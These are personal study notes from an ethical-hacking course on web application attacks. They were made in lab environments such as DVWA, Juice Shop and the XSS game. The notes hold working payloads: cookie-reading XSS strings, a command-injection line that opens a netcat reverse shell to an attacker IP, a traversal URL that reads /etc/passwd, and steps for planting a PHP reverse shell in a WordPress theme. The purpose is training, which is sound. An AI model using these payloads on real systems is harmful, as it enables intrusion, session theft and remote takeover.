2025-05-01 20:21

Status:

Tags: #ceh 

# Hacking Web applications

# 15/04/25 


## Web Application?
A Web Application is any program that is accessed over a network connection using HTTP, rather than existing within a device's memory. Web-based applications often run inside a web browser.

							(OR)
A Web application (Web app) is an application program that is stored on a remote server and delivered over the Internet through a browser interface.



### OSWAP TOP 10 
We use OSWAP TOP 10 for testing of web applications, which publishes every 4 years 


- OWASP Web Application Penetration Checklist (by tanprathan)
	- this check list is used by companies for web pentesting   
- How we can test using web application testing guide pdf


- white box pen testing 
	- learn 2 to 3 scripting 
	 1.  .net jsp application asp psp
### Steps for learning web application pen testing  / Bug bounty
1. read book
	- web application hackers handbook
2. using website
	- https://www.hacksplaining.com/lessons
	- https://portswigger.net/web-security
3. Report writing
4. Test web application CTF
- For testing vulnerable applications  
	1. OWASP Juice Shop (node js ) (web application ) (used in interview )
		
	2. OWASP Web goat - vulnhub.com - [https://www.vulnhub.com/entry/webgoat-1,365/](https://www.vulnhub.com/entry/webgoat-1,365/) (javja) (VM)
		
	3. vulnweb (web site )
For bug bounty platform
- first register as researcher in this platform for bug bounty  
	- hackerone
	- bugcrowd


### Common Types Of Attacks In Web Applications

#### some important things while testing We application 
1. where to test 
2. what is the payload that you need 
3. how critical bug is 

#### Cross-Site Scripting (XSS) Attack

- XSS attack takes advantage of dynamically generated we content based on user input provide on web pages.
    
- An attacker, tries to inject commands input fields provided on web pages
    
- If the web server is unable to properly validate input fields on web page then it will execute the command provided by the attacker and unknowingly reveal information related to client.
    
- Types of XSS
    

1. Reflected XSS (clint side )
2. Stored XSS (server side )
3. DOM (clint side )


#### Reflected XSS
##### practical using meta2
- step 1 - open dvwa (10.10.10.6) 
- step 2 - login as admin p -  password 
- step 3  - select dvwa security 
	- set to low 
- step 4 - XSS reflected
- step 5 - find input field
- testing html tags 
	- ``<h1>donka</h1>``
- testing java script 
	- `` <script>alert("Hacker hai tu "); </script> ``
	- `` <script>alert(document.cookie);</script>``
- testing image tag 
	- `` <img src=1 href=1 onerror="javascript:alert (1)"></img>``
- testing http://testfire.net/
- `` <script>alert(document.cookie);</script> ``
- step 6  - select dvwa security 
	- set to medium 
		- `` <script>alert("Hacker hai tu "); </script> ``
- The script tag does not work in medium security and now to over come 
	- make tag as ``<Script>alert("Hacker hai tu "); </Script>``
- step 6  - select dvwa security 
	- set to high 
		- the script tag will not work (due to `htmlspecialchars` )
- step 7  - go on OWASP Juice Shop and check for vulnerabilities 
	- tags that worked 
		- ``` <img src=1 href=1 onerror="javascript:alert(1)"></img>```

#### Stored XSS
##### practical using meta2
- step 1 - login as admin p - password 
- step 2 - insert tag in input filed 
	- `` <script>alert("Hacker hai tu "); </script> ``
step 3 - login as 
	- pablo : letmein
- you will see pop up as alert 


#### DOM XSS 

- it will work in url as document 
##### practical using XSS game 
- here [link](https://xss-game.appspot.com/) 
- steps for clearing levels 
- level 1
	- `` <script>alert("Hacker hai tu "); </script> ``
- level 2
	- `` <img src=1 href=1 onerror="javascript:alert(1)"></img>``
- level 3
	- ``1' <img src=1 href=1 onerror="javascript:alert(1)"></img>``
- level 4
	-  ?timer=``3');alert('a)``
- level 5 
	- next=``javascript:alert()``
- level 6
	- frame``#data: text/plain,alert()``


- testing http://vulnweb.com/

### Command Injection Attacks

- Command injection vulnerability in a web application allows attackers to inject untrusted data and execute it as part of regular command or query
- Attacker use specially crafted malicious commands or queries to exploit these vulnerabilities which may result in data loss.
- Injection attacks are passable because of poor web development capabilities

TO run commands in web application 

- run in input fildes that uses
- use case 
	- ping 
- using  "; "and |  execute commands

when you can run this only if there is input field that allows   commands execute
- website that has vulnerability 
	- ping.eu 

##### Getting shell access on meta2 using command injection 
- To get shell using netcat
- run netcat in local machine 
	- nc -lvp 1234
- run necat command in target input field 
	- |  nc -e /bin/bash 10.10.10.4 1234 (-e gives shell access)

- nc -e /bin/bash 10.0.0.196 1234
  
  ### File Inclusion vulnerabilities

- Local File Inclusion - Allows an attacker to gain access to any file on server computer
    - Attacker xan even access file located apart from web-root folde.
  - Remote File Inclusion - Allows an attacker to gain access to any file
    - We can execute file located on remote server on the vulnerable server.


- practical meta2  
- ``http://10.10.10.6/dvwa/vulnerabilities/fi/?page=`` ``<filepath>``


### Directory Traversal

- Directory Traversal or Path Traversal is an attack on HTTP which allows attacker to access restricted directories outside of the web server root location
- Attacker try to access restricted Directory that contain sensitive information like server configuration files, application source code, etc.
- Attacker can mange to access file locate outside the web root because of this venerability
- `http://10.10.10.6/dvwa/vulnerabilities/fi/?page=/../../../../etc/passwd/`

To solve HSbox3 nmap port scan 80 open dirb web site or manually go /img
- -x .text
- accesing robot.txt
- edit etc/host
- add ipadres of hsbox3
- when ever you see wordpress we use
    - wpscan --url http.

Login as Administrator - /wp-admin/
Appearence > taltor≥ 404. phP hool in
erschool.in
Replace the code in 404. php with /usr/share/webshells/php/php-reverse-shell. php
Modify IP address to attacker's IP and update
On Attacker's terminal start listener
nc - Lvp ``<port>``

Open the following url in the browser
http://hackerschool.local/wp-content/themes/twentyseventeen/404.php

- [ ] start from 2:50:00 (HSBOX 3)


### References
cheat sheet for XSS Reflected XSS
	- add diffrent types of technology like - html, java script , ...,


## OWASP Juice Shop
- finding vulnerabilities
- XSS 
	 - github  https://github.com/payloadbox/xss-payload-list 
- tags that worked 
	- ``` <img src=1 href=1 onerror="javascript:alert(1)"></img>```
	- `` ``


learn about netcat 
learn about how check File Inclusion vulnerabilities in any website


